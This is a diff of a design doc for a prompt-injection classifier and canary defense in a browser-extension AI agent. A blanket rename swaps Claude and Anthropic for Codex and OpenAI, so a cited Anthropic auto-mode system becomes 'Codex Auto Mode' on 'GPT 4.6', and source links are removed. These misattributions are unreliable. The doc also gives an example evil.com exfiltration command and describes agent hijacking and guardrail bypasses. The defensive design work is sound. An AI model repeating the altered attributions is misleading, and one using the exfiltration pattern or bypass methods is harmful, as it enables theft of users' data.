@@ -3,17 +3,17 @@
 **Status:** P0 TODO (follow-up to sidebar security fix PR)
 **Branch:** garrytan/extension-prompt-injection-defense
 **Date:** 2026-03-28
-**CEO Plan:** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
+**CEO Plan:** ~/.cgstack/projects/garrytan-cgstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md
 
 ## The Problem
 
-The gstack Chrome extension sidebar gives Claude bash access to control the browser.
+The cgstack Chrome extension sidebar gives Codex bash access to control the browser.
 A prompt injection attack (via user message, page content, or crafted URL) can hijack
-Claude into executing arbitrary commands. PR 1 fixes this architecturally (command
-allowlist, XML framing, Opus default). This design doc covers the ML classifier layer
+Codex into executing arbitrary commands. PR 1 fixes this architecturally (command
+allowlist, XML framing, GPT default). This design doc covers the ML classifier layer
 that catches attacks the architecture can't see.
 
-**What the command allowlist doesn't catch:** An attacker can still trick Claude into
+**What the command allowlist doesn't catch:** An attacker can still trick Codex into
 navigating to phishing sites, clicking malicious elements, or exfiltrating data visible
 on the current page via browse commands. The allowlist prevents `curl` and `rm`, but
 `$B goto https://evil.com/steal?data=...` is a valid browse command.
@@ -22,7 +22,7 @@ on the current page via browse commands. The allowlist prevents `curl` and `rm`,
 
 | System | Approach | Result | Source |
 |--------|----------|--------|--------|
-| Claude Code Auto Mode | Two-layer: input probe scans tool outputs, transcript classifier (Sonnet 4.6, reasoning-blind) runs on every action | 0.4% FPR, 5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
+| Codex Auto Mode | Two-layer: input probe scans tool outputs, transcript classifier (GPT 4.6, reasoning-blind) runs on every action | 0.4% FPR, 5.7% FNR | OpenAI Codex |
 | Perplexity BrowseSafe | ML classifier (Qwen3-30B-A3B MoE) + input normalization + trust boundaries | F1 ~0.91, but Lasso Security bypassed 36% with encoding tricks | [Perplexity Research](https://research.perplexity.ai/articles/browsesafe), [Lasso](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
 | Perplexity Comet | Defense-in-depth: ML classifiers + security reinforcement + user controls + notifications | CometJacking still worked via URL params | [Perplexity](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet), [LayerX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
 | Meta Rule of Two | Architectural: agent must satisfy max 2 of {untrusted input, sensitive access, state change} | Design pattern, not a tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
@@ -31,8 +31,8 @@ on the current page via browse commands. The allowlist prevents `curl` and `rm`,
 | Multi-Agent Defense | Pipeline of specialized agents for detection | 100% mitigation in lab conditions | [arXiv](https://arxiv.org/html/2509.14285v4) |
 
 **Key insights:**
-- Claude Code auto mode's transcript classifier is **reasoning-blind** by design. It
-  sees user messages + tool calls but strips Claude's own reasoning, preventing
+- Codex auto mode's transcript classifier is **reasoning-blind** by design. It
+  sees user messages + tool calls but strips Codex's own reasoning, preventing
   self-persuasion attacks.
 - Perplexity concluded: "LLM-based guardrails cannot be the final line of defense.
   Need at least one deterministic enforcement layer."
@@ -105,7 +105,7 @@ on the current page via browse commands. The allowlist prevents `curl` and `rm`,
 ### Reusable Security Module: `browse/src/security.ts`
 
 ```typescript
-// Public API -- any gstack component can call these
+// Public API -- any cgstack component can call these
 export async function loadModel(): Promise<void>
 export async function checkInjection(input: string): Promise<SecurityResult>
 export async function scanPageContent(html: string): Promise<SecurityResult>
@@ -129,7 +129,7 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
 
 | Layer | What | How | Status |
 |-------|------|-----|--------|
-| L0 | Model selection | Default to Opus | PR 1 (done) |
+| L0 | Model selection | Default to GPT | PR 1 (done) |
 | L1 | XML prompt framing | `<system>` + `<user-message>` with escaping | PR 1 (done) |
 | L2 | DeBERTa classifier | @huggingface/transformers v4 WASM, 94.8% accuracy | **THIS PR** |
 | L2b | Regex patterns | Decode base64/URL/HTML entities, then pattern match | **THIS PR** |
@@ -145,7 +145,7 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
   USER INPUT
     |
     v
-  BROWSE SERVER (server.ts spawnClaude)
+  BROWSE SERVER (server.ts spawnCodex)
     |
     |  1. checkInjection(userMessage)
     |     -> DeBERTa WASM (~50-100ms)
@@ -159,10 +159,10 @@ type SecurityStatus = 'protected' | 'degraded' | 'inactive'
     |  3. injectCanary(prompt) -> adds secret token
     |
     |  4. If WARN: inject warning into system prompt
-    |     If BLOCK: show blocking message, don't spawn Claude
+    |     If BLOCK: show blocking message, don't spawn Codex
     |
     v
-  QUEUE FILE -> SIDEBAR AGENT -> CLAUDE SUBPROCESS
+  QUEUE FILE -> SIDEBAR AGENT -> CODEX SUBPROCESS
                                     |
                                     v (output stream)
                                   checkCanary(output)
@@ -223,7 +223,7 @@ In system prompt:
 
 In output stream checker:
   If output contains canary -> session compromised
-  -> Kill claude process
+  -> Kill codex process
   -> Warn user: "Session terminated: prompt injection detected"
   -> Log attempt
 ```
@@ -236,7 +236,7 @@ Sophisticated attacks avoid this, which is why it's one layer among seven.
 ### Local Logging (always on)
 
 ```json
-// ~/.gstack/security/attempts.jsonl
+// ~/.cgstack/security/attempts.jsonl
 {
   "ts": "2026-03-28T22:00:00Z",
   "url_domain": "example.com",
@@ -256,8 +256,8 @@ detection occurs, even if the user has telemetry set to "off":
 
 ```
 AskUserQuestion:
-  "gstack just blocked a prompt injection attempt from {domain}. These detections
-   are rare and valuable for improving defenses for all gstack users. Can we
+  "cgstack just blocked a prompt injection attempt from {domain}. These detections
+   are rare and valuable for improving defenses for all cgstack users. Can we
    anonymously report this detection? (payload hash + confidence score only,
    no URL, no personal data)"
 
@@ -267,7 +267,7 @@ AskUserQuestion:
 
 This respects user sovereignty while collecting high-signal security events.
 
-Note: The AskUserQuestion happens through the Claude subprocess (which has access to
+Note: The AskUserQuestion happens through the Codex subprocess (which has access to
 AskUserQuestion), not through the extension UI (which doesn't have an ask-user primitive).
 
 ## Shield Icon UI
@@ -286,7 +286,7 @@ new `/security-status` endpoint). Sidepanel polls `/health` and reads the securi
 
 ```
 1. Download BrowseSafe-Bench dataset (3,680 cases) on first run
-2. Cache to ~/.gstack/models/browsesafe-bench/ (not re-downloaded in CI)
+2. Cache to ~/.cgstack/models/browsesafe-bench/ (not re-downloaded in CI)
 3. Run every case through checkInjection()
 4. Report:
    - Detection rate per attack type (11 types)
@@ -306,7 +306,7 @@ The @huggingface/transformers WASM backend gives us ~50-100ms inference. That's 
 for sidebar input (human typing speed). But for scanning every page snapshot, every
 tool output, every browse command response... 100ms per check adds up.
 
-Claude Code auto mode's input probe runs server-side on Anthropic's infrastructure.
+Codex auto mode's input probe runs server-side on OpenAI's infrastructure.
 They can afford fast native inference. We're running on the user's Mac.
 
 ### The 5ms path: port DeBERTa tokenizer + inference to Bun-native
@@ -353,7 +353,7 @@ Components to port:
 - 5ms inference means we can scan EVERYTHING: every message, every page, every tool
   output, every browse command response. No latency tradeoffs.
 - Zero external dependencies. Pure TypeScript. Works everywhere Bun works.
-- gstack becomes the only open source tool with native-speed prompt injection detection.
+- cgstack becomes the only open source tool with native-speed prompt injection detection.
 - The tokenizer + inference engine could be published as a standalone package.
 
 **Why it might not:**
@@ -387,7 +387,7 @@ accelerate.symbols.cblas_sgemm(...);
 
 **Effort:** L (human: ~2 weeks / CC: ~4-6 hours)
 **Result:** ~5-10ms inference on Apple Silicon, pure Bun, no npm dependencies.
-**Limitation:** macOS-only (Linux would need OpenBLAS FFI). But gstack already
+**Limitation:** macOS-only (Linux would need OpenBLAS FFI). But cgstack already
 ships macOS-only compiled binaries.
 
 ## Codex Review Findings (from the eng review)
@@ -410,20 +410,20 @@ apply to this ML classifier PR:
    attacks on short/common payloads.
 
 5. **Read/Glob/Grep tool output injection** — even with Bash restricted, untrusted
-   repo content read via Read/Glob/Grep enters Claude's context. This is a known
+   repo content read via Read/Glob/Grep enters Codex's context. This is a known
    gap. Out of scope for this PR but should be tracked.
 
 ## Implementation Checklist
 
 - [ ] Add `@huggingface/transformers` to package.json
 - [ ] Create `browse/src/security.ts` with full public API
-- [ ] Implement `loadModel()` with download-on-first-use to ~/.gstack/models/
+- [ ] Implement `loadModel()` with download-on-first-use to ~/.cgstack/models/
 - [ ] Implement `checkInjection()` with DeBERTa + regex + encoding normalization
 - [ ] Implement `scanPageContent()` (same classifier, different input)
 - [ ] Implement `injectCanary()` + `checkCanary()`
 - [ ] Implement `logAttempt()` with salted hashing
 - [ ] Implement `getStatus()` for shield icon
-- [ ] Integrate into server.ts `spawnClaude()`
+- [ ] Integrate into server.ts `spawnCodex()`
 - [ ] Add canary checking to sidebar-agent.ts output stream
 - [ ] Add shield icon to sidepanel.js
 - [ ] Add blocking message UI to sidepanel.js
@@ -433,12 +433,12 @@ apply to this ML classifier PR:
 - [ ] Create browse/test/security-bench.test.ts (BrowseSafe-Bench harness)
 - [ ] Cache BrowseSafe-Bench dataset for offline CI
 - [ ] Add `test:security-bench` script to package.json
-- [ ] Update CLAUDE.md with security module documentation
+- [ ] Update AGENTS.md with security module documentation
 
 ## References
 
-- [Claude Code Auto Mode](https://www.anthropic.com/engineering/claude-code-auto-mode)
-- [Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
+- Codex Auto Mode
+- Codex Sandboxing
 - [BrowseSafe Paper](https://research.perplexity.ai/articles/browsesafe)
 - [BrowseSafe Model](https://huggingface.co/perplexity-ai/browsesafe)
 - [BrowseSafe-Bench Dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
@@ -446,7 +446,7 @@ apply to this ML classifier PR:
 - [Mitigating Prompt Injection in Comet](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet)
 - [Red Teaming BrowseSafe](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks)
 - [Meta Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/)
-- [Auto Mode Analysis (Simon Willison)](https://simonwillison.net/2026/Mar/24/auto-mode-for-claude-code/)
+- Auto Mode Analysis
 - [Prompt Injection Defenses (tldrsec)](https://github.com/tldrsec/prompt-injection-defenses)
 - [DeBERTa-v3-base-prompt-injection-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
 - [DeBERTa ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx)
